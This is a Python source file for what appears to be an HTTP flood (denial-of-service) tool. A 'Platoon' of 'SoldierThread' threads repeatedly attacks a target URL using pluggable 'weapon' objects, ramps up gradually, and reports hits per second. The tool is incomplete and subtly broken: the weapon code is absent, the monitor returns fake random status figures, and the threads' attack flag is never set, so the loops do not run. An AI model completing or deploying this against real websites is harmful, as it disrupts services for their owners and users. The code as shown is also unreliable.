
import app.console
import random
import threading
import time


class Monitor:

   def __init__(self):

      pass

   def report_hit(self, thread, http_status):

      # TODO print status line
      # TODO print alert when site does down / comes back

      pass
      # TODO store bytes, count time

   def get_status(self):

      return (500, random.randint(50,200))


class SoldierThread(threading.Thread):

   def __init__(self, id, monitor):
      """
      :param id:
      :param monitor:
      """

      threading.Thread.__init__(self)

      self._id = id
      self._monitor = monitor

      # whether the thread should be actively attacking
      self._is_attacking = False

   def attack(self, **kwargs):

      self._target_url = kwargs['target_url'] if 'target_url' in kwargs else None
      self._weapon = kwargs['weapon'] if 'weapon' in kwargs else None

      self.start()

   def hold_fire(self):

      app.console.log("stopping soldier thread #%d" % self._id)

      self._is_attacking = False

      if self.isAlive():
         self.join()

   def run(self):

      app.console.log("starting soldier thread #%d" % self._id)

      while self._is_attacking:

         http_status = self._weapon.attack(self._target_url)

         self._monitor.report_hit(self, http_status)


class Platoon:
   """Platoon of soldier threads which run an attack."""

   def __init__(self, **kwargs):
      """

      :param num_soldiers: The number of soldier threads to spawn
      """

      self._num_soldiers = int(kwargs['num_soldiers']) if 'num_soldiers' in kwargs else 1

      self._monitor = Monitor()

      # whether the platoon should be actively attacking
      self._is_attacking = False

      # spawn all of the soldier threads
      self._soldiers = []
      for soldier_id in range(0, self._num_soldiers):
         soldier = SoldierThread(soldier_id, self._monitor)
         self._soldiers.append(soldier)

   def attack(self, **kwargs):
      """
      Start the attack. Will start up all of the soldier threads and give them a target
      :param target_url: The target URL/domain to be attacked
      :param weapon_factory: The weapon factory to use to spawn the weapons used by the soldier threads
      """

      target_url = kwargs['target_url'] if 'target_url' in kwargs else None
      weapon_factory = kwargs['weapon_factory'] if 'weapon_factory' in kwargs else None

      app.console.log("starting attack on %s" % target_url)

      self._is_attacking = True

      # start each of the soldier threads attacking
      # will slowely ramp up the soldier threads over a number of seconds (i.e. wont create them all at once)
      for soldier in self._soldiers:

         weapon = weapon_factory.make()

         soldier.attack(
            target_url=target_url,
            weapon=weapon
         )

         # introduce artifical delay between starting threads some where between 1-2 seconds
         # we use 11 as it is a prime numebr and will stagger the threads nicely
         delay = random.randint(0, 11) / 11 + 1.0
         time.sleep(delay)

      # update status line periodically
      while self._is_attacking:

         (http_status, hits_per_sec) = self._monitor.get_status()

         app.console.log("%s %0.2f hits per sec" % (http_status, hits_per_sec))
         app.console.back(1)

         # repeat every second
         time.sleep(1.0)

      app.console.log("done")

   def hold_fire(self):
      """Stop the attack, tell all of the soldier threads to hold_fire()"""

      self._is_attacking = False

      for soldier in self._soldiers:
         soldier.hold_fire()
